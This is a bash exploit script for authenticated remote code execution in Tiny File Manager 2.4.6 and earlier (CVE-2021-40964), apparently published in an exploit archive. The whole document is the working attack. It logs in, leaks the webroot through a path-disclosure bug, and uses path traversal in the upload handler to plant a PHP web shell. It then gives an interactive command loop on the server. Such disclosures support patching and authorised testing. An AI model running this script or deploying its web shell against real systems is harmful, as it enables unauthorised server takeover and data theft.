# Exploit Title: Tiny File Manager 2.4.6 - Remote Code Execution (RCE)
# Date: 14/03/2022
# Exploit Author: FEBIN MON SAJI
# Software Link: https://github.com/prasathmani/tinyfilemanager
# Version: Tiny File Manager <= 2.4.6
# Tested on: Ubuntu 20.04
# CVE : CVE-2021-40964
# Reference: https://febin0x4e4a.wordpress.com/2022/01/23/tiny-file-manager-authenticated-rce/

#!/bin/bash

check(){

which curl
if  [ $? = 0 ]
then
printf "[✔] Curl found! \n"
else
printf "[❌] Curl not found! \n"
exit
fi

which jq
if  [ $? = 0 ]
then
printf "[✔] jq found! \n"
else
printf "[❌] jq not found! \n"
exit
fi
}
usage(){

printf "
TIny File Manager Authenticated RCE Exploit.

By FEBIN

$0 <URL> <Admin Username> <Password>

Example: $0 http://files.ubuntu.local/index.php admin \"admin@123\"

"
}

log-in(){
URL=$1
admin=$2
pass=$3
cookie=$(curl "$URL" -X POST -s -d "fm_usr=$admin&fm_pwd=$pass" -i | grep "Set-Cookie: " | sed s/"Set-Cookie: "//g | tr -d " " | tr ";" "\n" | head -1)

if [ $cookie ]
then
printf "\n[+]  Login Success! Cookie: $cookie \n"
else
printf "\n[-] Logn Failed! \n"
fi

URL=${URL}
}

find_webroot(){


webroot=$(curl -X POST "$URL?p=&upload" -d "type=upload&uploadurl=http://vyvyuytcuytcuycuytuy/&ajax=true" -H "Cookie: $cookie" -s | jq | grep file | tr -d '"' | tr -d "," | tr -d " " | sed s/"file:"//g | tr "/" "\n" | head --lines=-1 | tr "\n" "/" )


if [ $webroot ]
then
printf "\n[*] Try to Leak Web root directory path \n\n"
printf "[+] Found WEBROOT directory for tinyfilemanager using full path disclosure bug : $webroot \n\n"
else
printf "[-] Can't find WEBROOT! Using default /var/www/html \n"
webroot="/var/www/html"
fi
}

upload(){

#webroot="/var/www/tiny/"
shell="shell$RANDOM.php"
echo "<?php system(\$_REQUEST['cmd']); ?>" > /tmp/$shell



curl $URL?p= -X POST -s -H "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0" -b $cookie -F "p=" -F "fullpath=../../../../../../../..${webroot}/${shell}" -F "file=@/tmp/$shell" | grep "successful"


}

exploit(){

WEB_URL=$(printf "$URL" | tr "/" "\n" | head --lines=-1 | tr "\n" "/")

upload


if [ $? = 0 ]
then
printf "[+] File Upload Successful! \n"
else
printf "[-] File Upload Unsuccessful! Exiting! \n"
exit 1
fi


printf "[+] Checking for the shell \n"


curl ${WEB_URL}/${shell}?cmd=echo%20found -s | head -1 | grep "found" >/dev/null
if [ $? = 0 ]
then
printf "[+] Shell found ${WEB_URL}/$shell \n"
else
printf "[-] Shell not Found! It might be uploaded somewhere else in the server or got deleted. Exiting! \n"
exit 2
fi

printf "[+] Getting shell access! \n\n"

while true
do
printf "$> "
read cmd
curl  ${WEB_URL}/$shell -s -X POST -d "cmd=${cmd}"
done
}

if [ $1 ] && [ $2 ] && [ $3 ]
then
check
log-in $1 $2 $3

find_webroot


exploit
else
usage
fi